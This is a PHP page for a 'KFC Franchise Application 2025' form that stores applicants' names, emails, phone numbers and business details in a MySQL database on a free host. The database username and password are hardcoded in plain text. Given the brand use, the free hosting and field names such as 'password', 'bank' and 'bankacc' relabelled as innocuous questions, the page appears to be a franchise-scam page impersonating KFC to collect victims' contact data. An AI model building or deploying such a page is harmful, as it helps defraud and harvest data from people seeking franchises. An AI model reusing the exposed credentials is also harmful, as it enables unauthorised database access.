<?php
// ================= DATABASE CONNECTION =================
$host = "sql100.infinityfree.com";
$user = "if0_40637241";
$pass = "Laljigst77";
$db   = "if0_40637241_kfc";

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) {
    die("DB Error: " . $conn->connect_error);
}

// ================= FORM SUBMIT =================
$message = "";

if (isset($_POST['submit'])) {

    $name       = $conn->real_escape_string($_POST['name']);
    $email      = $conn->real_escape_string($_POST['email']);
    $phone      = $conn->real_escape_string($_POST['phone']);
    $address    = $conn->real_escape_string($_POST['address']);
    $experience = $conn->real_escape_string($_POST['pincode']);
    $years      = $conn->real_escape_string($_POST['password']);

    $state      = $conn->real_escape_string($_POST['code']);
    $city       = $conn->real_escape_string($_POST['Ccode']);
    $district   = $conn->real_escape_string($_POST['bank']);
    $pin        = $conn->real_escape_string($_POST['bankacc']);

    $sql = "INSERT INTO applicants 
    (name,email,phone,address,experience,years,state,city,district,pincode)
    VALUES ('$name','$email','$phone','$address','$experience','$years','$state','$city','$district','$pin')";

    if ($conn->query($sql)) {
        $message = "<div style='padding:12px;background:green;color:white;text-align:center;font-size:18px;border-radius:5px;'>✔ Application Submitted Successfully!</div>";
    } else {
        $message = "<div style='padding:12px;background:red;color:white;text-align:center;font-size:18px;border-radius:5px;'>❌ Error: ".$conn->error."</div>";
    }
}
?> 

<?php include('header.php'); ?>

<div class="container">
<div class="row">
<div class="col-md-12">
<br><br><br>

<h1 class="dm1">KFC Franchise Application 2025</h1>

<p>Yes, KFC franchise business is profitable...</p>

<form method="POST" action="">
    <div class="contact100-form">

        <label class="label-input100">Personal Information</label>

        <div class="wrap-input100">
            <input class="input100" type="text" name="name" placeholder="Enter Your Name" required>
        </div>

        <div class="wrap-input100">
            <input class="input100" type="email" name="email" placeholder="Enter Your Email" required>
        </div>

        <div class="wrap-input100">
            <input class="input100" type="text" name="phone" placeholder="Enter Your Mobile Number" required>
        </div>

        <div class="wrap-input100">
            <input class="input100" type="text" name="address" placeholder="Current Business Name">
        </div>

        <div class="wrap-input100">
            <select class="input100" name="pincode" required>
                <option value="">Select Business Experience</option>
                <option value="Hotel">Hotel</option>
                <option value="Restaurant">Restaurant</option>
                <option value="Others">Others Non-Hotel/Restaurant</option>
                <option value="None">None</option>
            </select>
        </div>

        <div class="wrap-input100">
            <input class="input100" type="text" name="password" placeholder="Years In Business" required>
        </div>

        <label class="label-input100">Applying Area</label>

        <div class="wrap-input100">
            <input class="input100" type="text" name="code" placeholder="State">
        </div>

        <div class="wrap-input100">
            <input class="input100" type="text" name="Ccode" placeholder="City">
        </div>

        <div class="wrap-input100">
            <input class="input100" type="text" name="bank" placeholder="District">
        </div>

        <div class="wrap-input100">
            <input class="input100" type="text" name="bankacc" placeholder="Pin Code">
        </div>

        <div style="text-align:center;">
            <input type="submit" name="submit" class="btn11a" value="Submit">
        </div>

    </div>
</form>

<br><br><br>

</div>
</div>
</div>

</body>
</html>
